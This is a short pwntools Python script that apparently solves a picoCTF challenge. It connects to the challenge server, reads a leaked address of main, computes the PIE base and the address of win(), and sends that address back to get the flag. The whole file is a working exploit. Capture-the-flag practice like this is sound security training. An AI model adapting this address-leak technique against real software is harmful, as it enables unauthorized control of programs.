from pwn import *

# load the on‑disk binary
elf = ELF("./vuln")

# start process (or remote)
# p = process("./vuln")
p = remote("rescued-float.picoctf.net", "62912")

# grab the leak of main’s runtime address
p.recvuntil(b"main: ")
main_leak = int(p.recvline().strip(), 16)

# compute base address of the PIE (or non‑PIE) image
base = main_leak - elf.symbols['main']

# compute the real address of win()
win_addr = base + elf.symbols['win']

# send it back, in hex
# p.sendline(hex(win_addr))
hex_str = hex(win_addr)              # str, e.g. "0x7ffff7a05aa0"
p.sendline(hex_str.encode('ascii'))  # bytes, e.g. b"0x7ffff7a05aa0"

# now you should hit the win() logic
p.recvuntil(b"You won!\n")
flag = p.recvline().strip().decode()
print(flag)

p.close()
